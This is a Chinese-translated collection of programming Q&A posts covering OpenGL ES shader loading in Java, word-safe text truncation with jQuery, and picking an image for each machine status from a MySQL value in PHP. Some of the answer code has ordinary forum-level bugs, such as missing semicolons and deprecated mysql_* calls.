        int vertexShader = loadShader(GLES20.GL_VERTEX_SHADER, vertexSource);
        if (vertexShader == 0)
        {
            System.err.println("Failed to load vertex shader.");
            return 0;
        }

        int pixelShader = loadShader(GLES20.GL_FRAGMENT_SHADER, fragmentSource);
        if (pixelShader == 0)
        {
            System.err.println("Failed to load fragment shader.");
            return 0;
        }

        int program = GLES20.glCreateProgram();
        if (program != 0)
        {
            GLES20.glAttachShader(program, vertexShader);
            checkGlError("glAttachShader");
            GLES20.glAttachShader(program, pixelShader);
            checkGlError("glAttachShader");
            GLES20.glLinkProgram(program);
            int[] linkStatus = new int[1];
            GLES20.glGetProgramiv(program, GLES20.GL_LINK_STATUS, linkStatus, 0);
            if (linkStatus[0] != GLES20.GL_TRUE)
            {
                GLES20.glDeleteProgram(program);
                program = 0;
            }
        }
        return program;
    }

    private static int loadShader(int shaderType, String source)
    {
        int shader = GLES20.glCreateShader(shaderType);
        if (shader != 0)
        {
            GLES20.glShaderSource(shader, source);
            GLES20.glCompileShader(shader);
            int[] compiled = new int[1];
            GLES20.glGetShaderiv(shader, GLES20.GL_COMPILE_STATUS, compiled, 0);
            if (compiled[0] == 0)
            {
                GLES20.glDeleteShader(shader);
                shader = 0;
            }
        }
        return shader;
    }

    private static void checkGlError(String op)
    {
        int error;
        while ((error = GLES20.glGetError()) != GLES20.GL_NO_ERROR)
        {
            throw new RuntimeException(op + ": glError " + error);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T15:35:29.597

**你最后缺少“\n”**

**避免使用那些矩阵堆栈，当您的代码超过 1000 行代码时，无论是 openglgame 还是 openglapp**

**为了加快速度，在着色器代码中使用 const、局部变量并在片段着色器中执行更多计算**

这是一个着色器集

```
private static final String vertexShaderCodeLight = 
        "uniform vec4 uVPosition;                   \n"
    +   "uniform mat4 uP;                           \n"
    +   "void main(){                               \n"
    +   " gl_PointSize = 15.0;                      \n"
    +   " gl_Position = uP * uVPosition;            \n"
    +   "}                                          \n";
private static final String fragmentShaderCodeLight = 
        "#ifdef GL_FRAGMENT_PRECISION_HIGH          \n"
    +   "precision highp float;                     \n"
    +   "#else                                      \n"
    +   "precision mediump float;                   \n"
    +   "#endif                                     \n"
    +   "void main(){                               \n"
    +   " gl_FragColor = vec4(1.0,1.0,1.0,1.0);     \n"
    +   "}                                          \n"; 
```

# javascript - 如何缩短纯 HTML 文本

> ID：11806995
> 
> 赞同：1
> 
> 时间：2012-08-04T08:07:36.950
> 
> 标签：javascript, jquery

> **可能重复：**
> [如何在 jQuery 中截断字符串？](https://stackoverflow.com/questions/4637942/how-can-i-truncate-a-string-in-jquery)

我有这段代码，它只允许显示一定数量的字符：

```
$(function(){
  $(".description").each(function(i){
    len=$(this).text().length;
    if(len>10)
    {
      $(this).text($(this).text().substr(0,260)+'...');
    }
  });       
});
    }); 
```

问题是它不区分单词，所以它在单词中间切开。我该怎么做才能让它只在最后一个字之后被剪掉？

# php - 根据数据库中的值在 div 中显示图像

> ID：11806998
> 
> 赞同：0
> 
> 时间：2012-08-04T08:08:14.530
> 
> 标签：php, mysql, css, html

我一直在做一个项目，但我已经到了卡住的地步。我有一个数据库，其中包含一些机器的工作状态。状态的值从 1 到 5。我需要能够根据该 Mahcine 数据库中出现的值在网页中为每台机器显示不同的图像。我在如何做到这一点上画了一个很大的空白。我使用的是 MySQL 数据库，一切都是用 PHP 编写的。

基本上就是这个。如果机器的状态值为 1，则它显示绿色图像。如果值为 2，那么它将是黄色的，依此类推。. .

希望大家能帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:41:46.997

不要使用 img 标签，而是创建一个 div，您可以为其应用与机器状态值相同的样式类

```
 <div class="machine status<?php echo $status;?>" ></div> 
```

现在在你的 CSS 中，

```
.status1{
    background-image:url(red.jpg);
}

.status2{
    background-image:url(green.jpg);
}

.status3{
    background-image:url(jpg.jpg);
}

.machine{
  width:50px;
  height:50px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:20:53.157

你可以尝试这样的事情：

```
// your mysql select, wich contains the machine data.
$query = mysql_query("select the data about machines...");

// you iterate on the result set and fetch each row to $data
while($data = mysql_fetch_array($query))
{
    switch($data['machine'])
    {
        case "machine type 1": // you can put integer values here as well, like case 1:
            echo '<img src="first_machine.jpg" alt = "first machine" />'
        break;

        case "machine type 2":
            echo '<img src="second_machine.jpg" alt = "second machine" />'
        break;

        default: // undefinied
            echo '<img src = "undefinied.jpg" alt = "undefinied" />'
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-07T09:47:26.657

```
 Ok you can't display multiple images within a image/jpeg page...

  You're telling the browser that the page is image/jpeg (in other words, the page is     AN IMAGE) but you're echoing out multiple image data

You should rather use the gallery page to show all images like this:

<?php
// $images = result from database of all image rows
foreach ($images as $img) echo '<img src="img.php?id='.$img["id"].'">';
?>

and in img.php:

 // Load the image data for id in $_GET['id'];
header("Content-type: image/jpeg");
echo $data; 
```